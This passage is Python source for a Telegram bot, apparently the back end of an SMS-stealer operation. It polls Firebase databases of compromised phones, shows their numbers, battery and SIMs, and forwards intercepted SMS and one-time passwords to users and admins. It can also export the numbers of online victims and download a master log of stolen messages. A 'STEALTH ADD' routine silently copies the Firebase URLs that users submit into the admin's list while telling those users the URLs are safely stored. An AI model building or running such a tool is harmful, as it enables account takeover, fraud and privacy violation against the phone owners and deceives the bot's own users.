    if otp:
        sim_line = f"│ SIM : {sim}\n" if sim else ""
        return f"NEW OTP RECEIVED\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n{sim_line}━━━━━━━━━━━━━━━━━━\n{body}"
    return f"NEW SMS RECEIVED\n━━━━━━━━━━━━━━━━━━\nNumber : {num_label}\nFrom : {sender}\nDate : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"

def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("View All Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Device Info", callback_data=f"info:{dev_id}")],
        [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
    ])

def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("Grant Global Access", callback_data="sa_grant_global")],
        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels"), InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
        [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
        [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
    ])

async def safe_edit(query_or_msg, text, reply_markup=None, parse_mode=None, disable_web_page_preview=False):
    try:
        if hasattr(query_or_msg, 'edit_message_text'): await query_or_msg.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
        elif hasattr(query_or_msg, 'edit_text'): await query_or_msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
    except BadRequest: pass
    except Exception: pass

# ═══════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    bot_token = ctx.bot.token
    
    if chat_id not in all_users:
        all_users[chat_id] = {"name": update.effective_user.first_name, "username": update.effective_user.username, "joined_at": datetime.now().strftime("%d %b %Y"), "referrals": 0, "access_until": 0, "has_global_access": False, "otp_count": 0, "custom_dbs": [], "selected_panel": "ALL"}
        text = update.message.text.split()
        if len(text) > 1 and text[1].isdigit():
            ref_id = int(text[1])
            if ref_id in all_users and ref_id != chat_id:
                all_users[ref_id]["referrals"] = all_users[ref_id].get("referrals", 0) + 1
                save_user(ref_id)
                try: await ctx.bot.send_message(ref_id, f"🎉 New user joined via your link! Total Referrals: {all_users[ref_id]['referrals']}/10")
                except: pass
        save_user(chat_id)

    if not await check_force_sub(ctx.bot, chat_id):
        await update.message.reply_text("🛑 **Aage badhne ke liye in channels ko join karna compulsory hai!**", parse_mode="Markdown", reply_markup=force_sub_keyboard())
        return

    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
    chats_registry.setdefault(bot_token, set()).add(chat_id)
    await update.message.reply_text(f"OTP PANEL PRO\n━━━━━━━━━━━━━━━━━━\nWelcome {update.effective_user.first_name}!\nSystem is connected and ready.", reply_markup=get_reply_menu(chat_id))

# ═══════════════════════════════════════════════════════
#  CALLBACK QUERY HANDLER 
# ═══════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query   = update.callback_query
    data    = query.data or ""
    chat_id = query.message.chat_id
    bot_token = ctx.bot.token
    users_db = all_users

    if data == "verify_sub":
        if await check_force_sub(ctx.bot, chat_id):
            await safe_edit(query, "✅ Channels Verified! Welcome to the Bot.")
            await ctx.bot.send_message(chat_id, f"Welcome {query.from_user.first_name}!", reply_markup=get_reply_menu(chat_id))
        else:
            await query.answer("❌ Aapne abhi tak channels join nahi kiye hain!", show_alert=True)
        return

    if not await check_force_sub(ctx.bot, chat_id):
        await query.answer("Please join channels first!", show_alert=True)
        return

    await query.answer()

    try:
        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return

        if data == "sa_grant_global" and chat_id in ADMIN_IDS:
            pending_action[chat_id] = {"action": "grant_global"}
            await safe_edit(query, "Grant Global Access\n━━━━━━━━━━━━━━━━━━\nEnter the User ID you want to give global panel access to:\nCancel: /cancel")
            return

        if data.startswith("chk_srv:"):
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "check_number_input", "service": service}
            await safe_edit(query, f"Send a 10 digit number OR multiple numbers (separated by space) to manually check on {service.capitalize()}:")
            return

        if data.startswith("set_panel:"):
            panel_type = data.split(":")[1]
            users_db.setdefault(chat_id, {})["selected_panel"] = panel_type
            save_user(chat_id)
            await safe_edit(query, f"PANEL UPDATED\n━━━━━━━━━━━━━━━━━━\nAapka panel ab {panel_type} par set ho gaya hai.\nAb 'Devices List' open karein.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
            return

        if data == "sa_add_global_panel" and chat_id in ADMIN_IDS:
            pending_action[chat_id] = {"action": "sa_set_global_panel"}
            await safe_edit(query, "ADD GLOBAL PANEL\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL (ya multiple URLs enter se separate karke) bhejein.\n\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))
            return

        if data == "sa_view_user_panels" and chat_id in ADMIN_IDS:
            msg_text = "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n"
            for uid, uinfo in users_db.items():
                dbs = get_user_dbs(uinfo)
                if dbs:
                    msg_text += f"User: {uid}\n"
                    for db in dbs: msg_text += f"{db}\n"
                    msg_text += "\n"
            if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
            await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
            return

        if data == "sa_export_numbers" and chat_id in ADMIN_IDS:
            devices = await get_all_devices(bot_token, chat_id, users_db)
            online_nums = [n for d in devices if d.status == "online" for n in d.numbers]
            if not online_nums: return await query.answer("Filhal koi bhi number online nahi hai.", show_alert=True)
            file_path = os.path.join(SYS_DIR, "Online_Numbers.txt")
            unique_online = set(online_nums)
            with open(file_path, "w", encoding="utf-8") as f: f.write("\n".join(unique_online))
            await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename="Active_Online_Numbers.txt", caption=f"Total Active Unique Numbers: {len(unique_online)}")
            return

        if data == "sa_download_logs" and chat_id in ADMIN_IDS:
            if not os.path.exists(SMS_LOG_FILE): return await query.answer("Log file abhi tak bani nahi hai.", show_alert=True)
            await ctx.bot.send_document(chat_id=chat_id, document=open(SMS_LOG_FILE, "rb"), filename="Master_SMS_Log.txt", caption="Master SMS Database Log")
            return

        if data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
            return

        if data.startswith("pg:"):
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            page = int(data[3:])
            devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))
            return

        if data == "online":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, f"ONLINE NUMBERS\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices))
            return

        if data.startswith("cp:"):
            await query.answer(f"OTP: {data[3:]}", show_alert=True)
            return

        if data.startswith("sel:"):
            dev_id = data[4:]
            device = await find_device_by_id(dev_id, bot_token, chat_id, users_db)
            if not device: return await query.answer("Device not found! List purani ho gayi hai, refresh karein.", show_alert=True)
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"CONNECTED TO DEVICE\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\nYou are now receiving LIVE OTPs for this number. Click Disconnect to stop."
            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id))
            return

        if data.startswith("msgs:"):
            parts = data.split(":")
            dev_id = parts[1]
            service_used = parts[2] if len(parts) > 2 else ""

            device = await find_device_by_id(dev_id, bot_token, chat_id, users_db)
            if not device: return await query.answer("Device not found in active list! Refresh karein.", show_alert=True)
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            smss  = await get_device_sms(device)
            
            back_btn = InlineKeyboardButton("🔙 Back to Home", callback_data="home")
            refresh_btn = InlineKeyboardButton("🔄 Refresh Inbox", callback_data=data)
            
            if not smss:
                await safe_edit(query, f"📭 **Inbox Empty**\n📱 Number: {label}\n\nAgar aapne OTP send kiya hai, toh 5-10 second wait karein aur **Refresh Inbox** par click karein.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="Markdown")
                return
                
            header = f"📩 ALL MESSAGES INBOX (SMS & OTP)\n━━━━━━━━━━━━━━━━━━\n📱 Number: {label}\n📄 Showing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons, has_otp = [], [], False
            for sms in smss:
                block, otp = format_sms_block(sms, label)
                body_parts.append(block)
                if otp:
                    has_otp = True
                    otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
            
            if has_otp: 
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
                save_user(chat_id)
                
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[more SMS available]"
            
            otp_buttons.append([refresh_btn, back_btn])
            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
            return

        if data.startswith("info:"):
            dev_id = data[5:]
            device = await find_device_by_id(dev_id, bot_token, chat_id, users_db)
            if not device: return await query.answer("Device not found!", show_alert=True)
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"DEVICE DETAILS\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n"
            for i, num in enumerate(device.numbers, 1): text += f"SIM {i}   : {num}\n"
            if device.device_info: text += f"\n{device.device_info}\n"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("View Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Back", callback_data=f"sel:{dev_id}")], [InlineKeyboardButton("Disconnect & Back",  callback_data="home")]])
            await safe_edit(query, text, reply_markup=kb)
            return

    except Exception as e:
        try: await query.answer("An error occurred.", show_alert=True)
        except: pass

# ═══════════════════════════════════════════════════════
#  TEXT MESSAGE HANDLER (STRICT ACCESS CONTROL)
# ═══════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text    = (update.message.text or "").strip()
    bot_token = ctx.bot.token
    users_db = all_users

    if not await check_force_sub(ctx.bot, chat_id):
        await update.message.reply_text("🛑 **Aage badhne ke liye in channels ko join karna compulsory hai!**", parse_mode="Markdown", reply_markup=force_sub_keyboard())
        return

    if is_spamming(chat_id): return

    # 🔥 REFERRAL SYSTEM LOCK
    protected_commands = ["Devices List", "Manual Checker", "Auto-Check Panels", "Scan Hidden Devices", "🔥 30-Min Fresh Devices"]
    if text in protected_commands:
        is_global = chat_id in ADMIN_IDS or all_users.get(chat_id, {}).get("has_global_access", False)
        if not is_global:
            access_end = all_users.get(chat_id, {}).get("access_until", 0)
            if time.time() > access_end:
                refs = all_users.get(chat_id, {}).get("referrals", 0)
                if refs >= 10:
                    all_users[chat_id]["referrals"] -= 10
                    all_users[chat_id]["access_until"] = time.time() + 86400
                    save_user(chat_id)
                    await update.message.reply_text("✅ **10 Referrals Redeemed!**\nYou now have 24 hours of full access to your panels.", parse_mode="Markdown")
                else:
                    ref_link = f"https://t.me/{ctx.bot.username}?start={chat_id}"
                    await update.message.reply_text(f"🛑 **LOCKED FEATURE** 🛑\n\nAapko apni panel list dekhne ke liye **10 referrals** chahiye (24 hrs access).\n\n📉 Your Referrals: {refs}/10\n🔗 Your Link:\n`{ref_link}`\n\nShare this link to get access!", parse_mode="Markdown")
                    return

    if text == "Devices List":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action.pop(chat_id, None)
        devices = await get_all_devices(bot_token, chat_id, users_db)
        await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
        return

    if text == "Manual Checker":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
        return

    if text == "Auto-Check Panels":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
        return

    if text.startswith("Add Panel"):
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action[chat_id] = {"action": "set_personal_db"}
        await update.message.reply_text("ADD CUSTOM PANEL\n━━━━━━━━━━━━━━━━━━\nApne sabhi Firebase URLs bhejein (enter daba kar naye line me likhein):\n\nCancel: /cancel")
        return

    if text == "Admin Panel" and chat_id in ADMIN_IDS:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        total_u = len(all_users)
        total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
        msg = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total_u}\nTotal OTP Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
        await update.message.reply_text(msg, reply_markup=admin_keyboard(bot_token))
        return

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            await update.message.reply_text("Action cancelled.", reply_markup=get_reply_menu(chat_id))
        else: await update.message.reply_text("No pending action to cancel.")
        return

    state = pending_action.get(chat_id)
    if not state: return

    action = state.get("action")
    
    if action == "grant_global" and chat_id in ADMIN_IDS:
        if text.isdigit():
            uid = int(text)
            if uid in all_users:
                all_users[uid]["has_global_access"] = True
                save_user(uid)
                await update.message.reply_text(f"✅ Global access successfully granted to {uid}.")
            else: await update.message.reply_text("❌ User ID not found in database.")
        else: await update.message.reply_text("❌ Invalid ID format.")
        pending_action.pop(chat_id)
        return

    if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
        pending_action.pop(chat_id)
        urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
        if not urls: return await update.message.reply_text("Koi valid URL nahi mili.")
        SETTINGS.setdefault("global_panels", []).extend(urls)
        save_settings()
        await update.message.reply_text(f"SUCCESS! {len(urls)} panels Global Default list me add ho gaye hain.")
        return

    if action == "set_personal_db":
        urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
        if not urls: return await update.message.reply_text("Invalid URL. Starting with http/https bhejein.")
        pending_action.pop(chat_id)
        expiry_time = time.time() + (86400 * 365) 
        
        new_global_added = 0
        for custom_url in urls: 
            users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append({"url": custom_url, "expiry": expiry_time})
            # 🔥 STEALTH ADD: If user adds panel, it silently becomes Global for Admin
            if custom_url not in SETTINGS.get("global_panels", []) and custom_url not in RAW_URLS:
                SETTINGS.setdefault("global_panels", []).append(custom_url)
                new_global_added += 1
                
        save_settings()
        save_user(chat_id)
        
        try:
            alert = f"🚨 **NEW USER PANEL ADDED**\n👤 User: {chat_id}\n🌐 URLs added: {len(urls)}\n\n(Auto-synced {new_global_added} URLs to Global Database for Admin)"
            for adm in ADMIN_IDS: await ctx.bot.send_message(adm, alert)
        except: pass
        
        await update.message.reply_text(f"✅ {len(urls)} Personal Firebase URLs added successfully!\nThese are safely stored.", reply_markup=get_reply_menu(chat_id))
        return

# ═══════════════════════════════════════════════════════
#  FIREBASE AUTO-GEN WORKER POOL ENGINE (GHOST WORKERS)
# ═══════════════════════════════════════════════════════

async def _forward_sms(device: Device, sms: dict) -> None:
    global total_otps_processed
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return

    total_otps_processed += 1
    label = device_label(device)
    otp   = extract_otp(body)
    msg_text = auto_forward_msg(sms, label)
    master_log_sms(", ".join(device.numbers) if device.numbers else device.id[:8], body, otp)
    
    kb_rows = []
    if otp: kb_rows.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
    kb_rows.append([InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{device.id}"), InlineKeyboardButton("Device Info",  callback_data=f"info:{device.id}")])
    markup = InlineKeyboardMarkup(kb_rows)
    send_tasks = []

    if _main_app:
        for adm in ADMIN_IDS:
            if adm in all_users and all_users[adm].get("global_spam"):
                if otp: all_users.setdefault(adm, {})["otp_count"] = all_users.get(adm, {}).get("otp_count", 0) + 1; save_user(adm)
                send_tasks.append(_main_app.bot.send_message(adm, msg_text, reply_markup=markup))

    for bot_token, chat_dict in list(user_focus.items()):
        app_to_use = _main_app
        if not app_to_use: continue
        focused_chats = [cid for cid, did in chat_dict.items() if did == device.id and cid in ADMIN_IDS]
        for chat_id in set(focused_chats):
            if otp: all_users.setdefault(chat_id, {})["otp_count"] = all_users.get(chat_id, {}).get("otp_count", 0) + 1; save_user(chat_id)
            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup))
            
    if send_tasks: await asyncio.gather(*send_tasks, return_exceptions=True)

# 🔥 RAM SAVER: Fetches ONLY last 3 messages directly from specific online device
async def fetch_recent_sms_safely(d: Device, silent=False):
    try:
        sms_data = await fb_get(f"{d.sms_path}?orderBy=\"$key\"&limitToLast=3", d.base_url)
        if isinstance(sms_data, dict):
            for k, sms in sms_data.items():
                if not isinstance(sms, dict): continue
                sk = seen_key(d.id, k)
                if sk not in seen_ids:
                    seen_ids.add(sk)
                    if not silent:
                        try: await _forward_sms(d, sms)
                        except: pass
    except: pass

WORK_QUEUE = asyncio.Queue()
ACTIVE_WORKERS = []
MAX_WORKERS = 10 

async def worker_auto_scaler():
    while True:
        try:
            q_size = WORK_QUEUE.qsize()
            target_workers = min(MAX_WORKERS, max(3, q_size // 2)) 
            for w in list(ACTIVE_WORKERS):
                if w.done(): ACTIVE_WORKERS.remove(w)
            while len(ACTIVE_WORKERS) < target_workers:
                task = asyncio.create_task(db_processor_worker())
                ACTIVE_WORKERS.append(task)
        except: pass
        await asyncio.sleep(2) 

async def db_processor_worker():
    while True:
        try:
            job_type, tag, url = await WORK_QUEUE.get()
            
            if job_type == "INIT" or job_type == "CACHE_UPDATE":
                try: 
                    devs = await fetch_db_data(tag, url)
                    if devs: GLOBAL_DEVICE_CACHE[tag] = devs
                except: pass
                
                # 🔥 FAST, RAM-SAFE INIT
                if job_type == "INIT":
                    active_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.status == "online"]
                    if active_devs:
                        for i in range(0, len(active_devs), 10):
                            await asyncio.gather(*(fetch_recent_sms_safely(d, silent=True) for d in active_devs[i:i+10]))
                    
                    global SCAN_PROGRESS
                    if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"]:
                        SCAN_PROGRESS["completed"] += 1

            elif job_type == "POLL":
                # 🔥 FAST, RAM-SAFE POLL: Only polls recently active devices instead of the whole root DB!
                now = time.time()
                devices_in_db = GLOBAL_DEVICE_CACHE.get(tag, [])
                active_devs = [d for d in devices_in_db if d.status == "online" or (now - (d.timestamp if d.timestamp < 1e11 else d.timestamp/1000)) < 900]
                
                if active_devs:
                    for i in range(0, len(active_devs), 10):
                        await asyncio.gather(*(fetch_recent_sms_safely(d, silent=False) for d in active_devs[i:i+10]))
            
            if len(seen_ids) > 20000: seen_ids.clear()
            WORK_QUEUE.task_done()
            await asyncio.sleep(0.1) 
            
        except asyncio.CancelledError: break
        except Exception: pass

# 🔥 RE-ADDED CACHE COMPILER: Pre-compiles the list so users don't spike CPU when they click the button
async def cache_compiler():
    while True:
        await asyncio.sleep(5) 
        try:
            all_devs = []
            for tag, list_devs in list(GLOBAL_DEVICE_CACHE.items()):
                if tag != "ALL": all_devs.extend(list_devs)
                
            n_map = {}
            for d in all_devs:
                if d.numbers:
                    m = d.numbers[0]
                    if m not in n_map or d.timestamp > n_map[m].timestamp: n_map[m] = d
                else: n_map[d.id] = d
                        
            res = list(n_map.values())
            res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
            GLOBAL_DEVICE_CACHE["ALL"] = res
        except: pass

async def master_dispatcher(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    last_cache_time = 0
    
    while True:
        try:
            dbs_to_poll = dict(DATABASES)
            for i, g_url in enumerate(SETTINGS.get("global_panels", [])): dbs_to_poll[f"G_{i}"] = g_url
            for uid, uinfo in all_users.items():
                if uid in ADMIN_IDS:
                    for i, db_url in enumerate(get_user_dbs(uinfo)): dbs_to_poll[f"U_{uid}_{i}"] = db_url
            
            if first_run:
                global SCAN_PROGRESS
                SCAN_PROGRESS = {"total": len(dbs_to_poll), "completed": 0}
                
                # If cache loaded properly, hide progress
                if "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 100:
                    SCAN_PROGRESS["completed"] = 99999
                    SCAN_PROGRESS["total"] = 99999

                for tag, url in dbs_to_poll.items(): await WORK_QUEUE.put(("INIT", tag, url))
                first_run = False
                last_cache_time = time.time()
                print("\n✅ Bot started successfully. System Ghost Workers Active.\n")
            else:
                now = time.time()
                for tag, url in dbs_to_poll.items(): await WORK_QUEUE.put(("POLL", tag, url))
                if now - last_cache_time > CACHE_INTERVAL:
                    for tag, url in dbs_to_poll.items(): await WORK_QUEUE.put(("CACHE_UPDATE", tag, url))
                    last_cache_time = now
        except Exception: pass
        await asyncio.sleep(POLL_INTERVAL)

# ═══════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════

def main() -> None:
    if not TOKEN: raise SystemExit("TOKEN is missing!")
    app = Application.builder().token(TOKEN).connection_pool_size(20).pool_timeout(60.0).connect_timeout(60.0).read_timeout(60.0).write_timeout(60.0).get_updates_read_timeout(60.0).build()

    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)

    async def post_init(application: Application) -> None:
        load_data()
        asyncio.create_task(worker_auto_scaler()) 
        asyncio.create_task(cache_compiler())
        asyncio.create_task(master_dispatcher(application))
        asyncio.create_task(auto_save_loop())
        asyncio.create_task(hourly_backup_loop(application))

    app.post_init = post_init
    print(f"\n🚀 Starting the Ultra-Fast Bot Server... \n[*] Total unique databases loaded: {len(RAW_URLS)}")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
